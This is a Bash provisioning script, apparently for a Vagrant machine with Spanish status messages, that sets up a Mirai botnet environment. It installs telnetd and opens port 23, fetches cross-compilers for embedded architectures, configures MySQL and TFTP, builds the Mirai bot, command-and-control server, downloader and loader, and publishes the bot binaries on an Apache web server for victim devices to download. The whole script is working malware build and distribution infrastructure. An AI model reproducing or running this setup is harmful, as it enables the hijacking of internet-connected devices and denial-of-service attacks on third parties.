#!/usr/bin/env bash

echo "*** Instalando paquetes... ***"
export DEBIAN_FRONTEND=noninteractive
if [ "$[$(date +%s) - $(stat -c %Z /var/cache/apt/pkgcache.bin)]" -ge 600 ]; then
  sudo apt-get update
fi

echo "*** Actualizando sistema, instalando requisitos... ***"
sudo apt upgrade -y

sudo apt-get install -y git 
sudo apt-get install -y gcc 
sudo apt-get install -y electric-fence 
sudo -E apt-get -q -y install mysql-server mysql-client 
sudo apt-get update -y
sudo apt upgrade -y
sudo apt-get install duende -y
sudo apt-get install telnetd -y
sudo ufw allow 23/tcp


wget https://go.dev/dl/go1.13.15.linux-amd64.tar.gz
tar -C /usr/local -xzf go1.13.15.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
source $HOME/.profile

mkdir -p /etc/maradns/logger/

COMPILERS="cross-compiler-armv4l cross-compiler-i586 cross-compiler-m68k cross-compiler-mips cross-compiler-mipsel cross-compiler-powerpc cross-compiler-sh4 cross-compiler-sparc"

if [ ! -d /vagrant/downloads ]; then
  echo "*** Descargando crosscompilers... ***"
  mkdir /vagrant/downloads/
  cd /vagrant/downloads/

  for compiler in $COMPILERS; do        
    wget -q https://www.uclibc.org/downloads/binaries/0.9.30.1/${compiler}.tar.bz2 --no-check-certificate
    if [ -f "${compiler}.tar.bz2" ]; then
      echo "*** $compiler descargado ***"
    else
      echo "!> No se puede descarga $compiler"
    fi
  done

fi

if [ ! -d /etc/xcompile ]; then
  echo "*** Instalando crosscompilers... ***"
  mkdir /etc/xcompile
  cd /etc/xcompile
 
   for compiler in $COMPILERS; do        
    cp /vagrant/downloads/${compiler}.tar.bz2 .
    if [ -f "${compiler}.tar.bz2" ]; then
      tar -jxf ${compiler}.tar.bz2
      rm ${compiler}.tar.bz2
      echo "export PATH=\$PATH:/etc/xcompile/$compiler/bin" >> ~/.mirairc
      echo "*** Compiler $compiler instalado ***"
    else
      echo "!> No se pudo descargar $compiler"
    fi
  done

  #for compiler in $COMPILERS; do        
   # wget -q https://www.uclibc.org/downloads/binaries/0.9.30.1/${compiler}.tar.bz2 --no-check-certificate
    #if [ -f "${compiler}.tar.bz2" ]; then
     # tar -jxf ${compiler}.tar.bz2
      #rm ${compiler}.tar.bz2
      #echo "export PATH=\$PATH:/etc/xcompile/$compiler/bin" >> ~/.mirairc
      #echo "*** Compiler $compiler instalado ***"
    #else
     # echo "!> Can not download $compiler"
    #fi
  #done

  echo "export PATH=\$PATH:/usr/local/go/bin" >> ~/.mirairc
  echo "export GOPATH=\$HOME/go" >> ~/.mirairc
  echo "source ~/.mirairc" >> ~/.bashrc

fi

echo "*** Recargando mirairc... ***"
source ~/.mirairc

echo "*** Requisitos de go... ***"
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords

echo "*** Configurando sql... ***"
mysql < /vagrant/configs/db.sql

echo "*** Configurando dnsmasq... ***"
mkdir -p /vagrant/tftp
killall dnsmasq || true
cp /vagrant/configs/dnsmasq.conf /etc/dnsmasq.conf
dnsmasq

echo "*** Instalando apache... ***"
sudo apt-get install apache2 -y
service apache2 start

echo "*** Building mirai bot y cnc... ***"
cd /vagrant/mirai/
./build.sh release telnet
cp /vagrant/mirai/release/mirai* /vagrant/tftp/

echo "*** Building dlr... ***"
cd /vagrant/mirai/dlr
./build.sh
cp /vagrant/mirai/dlr/release/* /vagrant/mirai/loader/bins/

echo "*** Building loader... ***"
cd /vagrant/mirai/loader
./build.sh

echo "*** Subiendo al servidor apache... ***"
sudo rm /var/www/html/index.html
sudo mkdir /var/www/html/bins
sudo cp /vagrant/mirai/release/mirai.* /var/www/html/bins
service apache2 restart

echo "*** Terminado ***"
